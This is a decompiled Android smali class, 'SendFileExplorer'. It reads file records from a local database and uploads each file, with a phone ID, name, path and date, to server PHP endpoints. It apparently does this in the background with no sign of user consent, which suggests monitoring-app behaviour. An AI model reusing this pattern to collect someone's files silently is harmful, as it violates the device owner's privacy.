.class public final Lef;
.super Ljava/lang/Object;
.source "SendFileExplorer.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field private static a:Z


# instance fields
.field private final b:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0

    .line 28
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 29
    iput-object p1, p0, Lef;->b:Landroid/content/Context;

    return-void
.end method

.method private a()V
    .locals 4

    .line 124
    :try_start_0
    invoke-static {}, Lcom/app/service/UploadDataService;->a()V

    .line 126
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "UploadDataService.getmNbTask() : "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 128
    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v0

    if-gtz v0, :cond_0

    .line 129
    iget-object v0, p0, Lef;->b:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lef;->b:Landroid/content/Context;

    const-class v3, Lcom/app/service/UploadDataService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 132
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 11

    const/4 v0, 0x0

    .line 35
    :try_start_0
    sget-boolean v1, Lef;->a:Z

    if-eqz v1, :cond_0

    .line 36
    invoke-direct {p0}, Lef;->a()V

    return-void

    :cond_0
    const/4 v1, 0x1

    .line 40
    sput-boolean v1, Lef;->a:Z

    .line 42
    new-instance v2, Lbp;

    iget-object v3, p0, Lef;->b:Landroid/content/Context;

    invoke-direct {v2, v3}, Lbp;-><init>(Landroid/content/Context;)V

    .line 43
    invoke-virtual {v2}, Lbp;->a()V

    .line 47
    invoke-virtual {v2}, Lbp;->c()Landroid/database/Cursor;

    move-result-object v3

    if-eqz v3, :cond_5

    .line 49
    invoke-interface {v3}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-lez v4, :cond_5

    .line 50
    invoke-interface {v3}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_5

    .line 52
    :cond_1
    new-instance v4, Lfg;

    invoke-direct {v4}, Lfg;-><init>()V

    .line 53
    invoke-interface {v3, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-virtual {v4, v5}, Lfg;->a(I)V

    .line 54
    invoke-interface {v3, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lfg;->a(Ljava/lang/String;)V

    const/4 v5, 0x2

    .line 55
    invoke-interface {v3, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lfg;->b(Ljava/lang/String;)V

    const/4 v5, 0x3

    .line 56
    invoke-interface {v3, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lfg;->d(Ljava/lang/String;)V

    const/4 v5, 0x4

    .line 57
    invoke-interface {v3, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lfg;->c(Ljava/lang/String;)V

    .line 59
    invoke-virtual {v4}, Lfg;->c()Ljava/lang/String;

    move-result-object v5

    if-eqz v5, :cond_4

    invoke-virtual {v4}, Lfg;->c()Ljava/lang/String;

    move-result-object v5

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_4

    .line 60
    new-instance v5, Ljava/io/File;

    invoke-virtual {v4}, Lfg;->c()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 62
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v6

    if-eqz v6, :cond_3

    .line 64
    invoke-virtual {v4}, Lfg;->d()Ljava/lang/String;

    move-result-object v6

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_2

    .line 65
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v7, p0, Lef;->b:Landroid/content/Context;

    invoke-static {v7}, Lda;->f(Landroid/content/Context;)I

    move-result v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Lfg;->e()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 67
    new-instance v7, Ljava/util/HashMap;

    invoke-direct {v7}, Ljava/util/HashMap;-><init>()V

    const-string v8, "idPhone"

    .line 68
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v10, p0, Lef;->b:Landroid/content/Context;

    invoke-static {v10}, Lda;->f(Landroid/content/Context;)I

    move-result v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v8, v9}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v8, "nameFile"

    .line 69
    invoke-virtual {v4}, Lfg;->b()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v8, v9}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v8, "pathFile"

    .line 70
    invoke-virtual {v7, v8, v6}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "date"

    .line 71
    invoke-virtual {v4}, Lfg;->d()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v6, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "fileExplorer/insertNewFileFirst.php"

    .line 73
    invoke-static {v6, v7}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v6

    if-eqz v6, :cond_4

    .line 74
    invoke-virtual {v4}, Lfg;->a()I

    move-result v6

    invoke-virtual {v2, v6, v4}, Lbp;->a(ILfg;)V

    .line 76
    new-instance v6, Ljava/util/HashMap;

    invoke-direct {v6}, Ljava/util/HashMap;-><init>()V

    const-string v7, "idPhone"

    .line 77
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lef;->b:Landroid/content/Context;

    invoke-static {v9}, Lda;->f(Landroid/content/Context;)I

    move-result v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "nameFile"

    .line 78
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4}, Lfg;->b()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v7, "multipart/form-data"

    .line 80
    invoke-static {v7}, Laqy;->b(Ljava/lang/String;)Laqy;

    move-result-object v7

    invoke-static {v7, v5}, Lare;->create(Laqy;Ljava/io/File;)Lare;

    move-result-object v5

    const-string v7, "uploadedfile"

    .line 81
    invoke-virtual {v4}, Lfg;->e()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8, v5}, Laqz$b;->a(Ljava/lang/String;Ljava/lang/String;Lare;)Laqz$b;

    move-result-object v5

    const-string v7, "fileExplorer/insertNewFile.php"

    .line 83
    invoke-static {v7, v6, v5}, Lcv;->a(Ljava/lang/String;Ljava/util/HashMap;Laqz$b;)Z

    move-result v5

    if-eqz v5, :cond_4

    .line 84
    invoke-virtual {v4}, Lfg;->a()I

    move-result v4

    invoke-virtual {v2, v4}, Lbp;->a(I)Z

    goto :goto_0

    .line 88
    :cond_2
    new-instance v5, Ljava/util/HashMap;

    invoke-direct {v5}, Ljava/util/HashMap;-><init>()V

    const-string v6, "idPhone"

    .line 89
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, p0, Lef;->b:Landroid/content/Context;

    invoke-static {v8}, Lda;->f(Landroid/content/Context;)I

    move-result v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "nameFile"

    .line 90
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4}, Lfg;->b()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 92
    new-instance v6, Ljava/io/File;

    invoke-virtual {v4}, Lfg;->c()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    const-string v7, "multipart/form-data"

    .line 94
    invoke-static {v7}, Laqy;->b(Ljava/lang/String;)Laqy;

    move-result-object v7

    invoke-static {v7, v6}, Lare;->create(Laqy;Ljava/io/File;)Lare;

    move-result-object v6

    const-string v7, "uploadedfile"

    .line 95
    invoke-virtual {v4}, Lfg;->e()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8, v6}, Laqz$b;->a(Ljava/lang/String;Ljava/lang/String;Lare;)Laqz$b;

    move-result-object v6

    const-string v7, "fileExplorer/insertNewFile.php"

    .line 97
    invoke-static {v7, v5, v6}, Lcv;->a(Ljava/lang/String;Ljava/util/HashMap;Laqz$b;)Z

    move-result v5

    if-eqz v5, :cond_4

    .line 98
    invoke-virtual {v4}, Lfg;->a()I

    move-result v4

    invoke-virtual {v2, v4}, Lbp;->a(I)Z

    goto :goto_0

    .line 102
    :cond_3
    invoke-virtual {v4}, Lfg;->a()I

    move-result v4

    invoke-virtual {v2, v4}, Lbp;->a(I)Z

    .line 106
    :cond_4
    :goto_0
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 109
    :cond_5
    invoke-virtual {v2}, Lbp;->b()V

    if-eqz v3, :cond_6

    .line 112
    invoke-interface {v3}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    .line 115
    invoke-static {v1}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    .line 118
    :cond_6
    :goto_1
    sput-boolean v0, Lef;->a:Z

    .line 119
    invoke-direct {p0}, Lef;->a()V

    return-void
.end method
